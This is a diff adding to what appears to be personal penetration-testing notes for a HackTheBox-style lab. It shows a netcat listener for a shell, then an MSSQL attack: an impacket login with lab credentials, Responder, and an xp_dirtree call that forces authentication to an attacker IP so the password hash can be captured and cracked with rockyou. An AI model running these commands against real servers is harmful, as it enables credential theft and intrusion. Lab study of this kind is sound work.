@@ -553,3 +553,14 @@ a. Network Exploitation
 		nc -v -n -l -p 1708
 		
 		you will get a shell
+
+		g.) Get access to a mysql server:
+		1. Add the IP address to the /etc/hosts file
+			example: 10.129.228.253 sequel.htb
+		2.) Impacket the username & password
+			impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
+		3.) In Kali, run the follwing command: responder -I tun0 -v
+		4.) In SQL, run the following command: where 10.10.14.30 is the kali host
+			EXEC MASTER.sys.xp_dirtree '\\10.10.14.30\test', 1, 1
+		5.) you will be able to get a hash value of connection. You can crack the password using rockyou.
+
